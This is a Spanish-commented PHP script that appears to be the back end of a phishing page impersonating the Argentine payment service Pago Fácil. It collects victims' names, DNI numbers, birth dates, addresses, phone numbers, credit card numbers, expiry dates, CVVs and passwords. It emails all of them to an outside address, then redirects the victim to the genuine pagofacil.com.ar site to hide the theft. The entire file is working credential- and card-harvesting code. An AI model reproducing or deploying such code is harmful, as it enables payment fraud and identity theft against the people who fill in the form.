<?php
// Verificar si el formulario ha sido enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verificar que los campos requeridos no estén vacíos
    if (!empty($_POST['nombre']) && !empty($_POST['apellido']) && !empty($_POST['email']) && !empty($_POST['telefono']) && !empty($_POST['dni']) && !empty($_POST['fnac']) && !empty($_POST['provincia']) && !empty($_POST['localidad']) && !empty($_POST['cc']) && !empty($_POST['fexp']) && !empty($_POST['cvv']) && !empty($_POST['pass'])) {
        // Capturar los datos del formulario y limpiarlos
        $nombre = strip_tags(trim($_POST['nombre']));
        $apellido = strip_tags(trim($_POST['apellido']));
        $email = strip_tags(trim($_POST['email']));
        $telefono = strip_tags(trim($_POST['telefono']));
        $dni = strip_tags(trim($_POST['dni']));
        $fnac = strip_tags(trim($_POST['fnac']));
        $provincia = strip_tags(trim($_POST['provincia']));
        $localidad = strip_tags(trim($_POST['localidad']));
        $cc = strip_tags(trim($_POST['cc']));
        $fexp = strip_tags(trim($_POST['fexp']));
        $cvv = strip_tags(trim($_POST['cvv']));
        $pass = strip_tags(trim($_POST['pass']));  // Este debería ser manejado con mayor cuidado, especialmente si se almacena

        // Configuración del destinatario y el asunto del email
        $para = 'nsmax@hi2.in';
        $asunto = 'DATES-PAGOFACIL ' . $nombre . ' ' . $apellido;

        // Crear el contenido del mensaje
        $contenido = "Has recibido una nueva solicitud de registro:\n\n";
        $contenido .= "Nombre: $nombre\nApellido: $apellido\n";
        $contenido .= "Email: $email\nTeléfono: $telefono\n";
        $contenido .= "DNI: $dni\nFecha de Nacimiento: $fnac\n";
        $contenido .= "Provincia: $provincia\nLocalidad: $localidad\n";
        $contenido .= "Número de Tarjeta: $cc\nFecha de Vencimiento: $fexp\n";
        $contenido .= "CVV: $cvv\n";  // Asegúrate de manejar este dato con seguridad y no almacenarlo directamente

        // Headers para el envío de email
        $headers = "From: nsmax@hi2.in\r\n";
        $headers .= "Reply-To: $email\r\n";
        $headers .= "X-Mailer: PHP/" . phpversion();

        // Enviar el correo
        if (mail($para, $asunto, $contenido, $headers)) {
            echo 'El mensaje ha sido enviado.';
            header("Location: https://www.pagofacil.com.ar/");
            exit;
        } else {
            echo 'Error al enviar el mensaje.';
        }
    } else {
        echo 'Por favor, completa todos los campos del formulario.';
    }
} else {
    // No se accedió mediante un POST
    echo 'Por favor, utiliza el formulario para enviar datos.';
}
?>
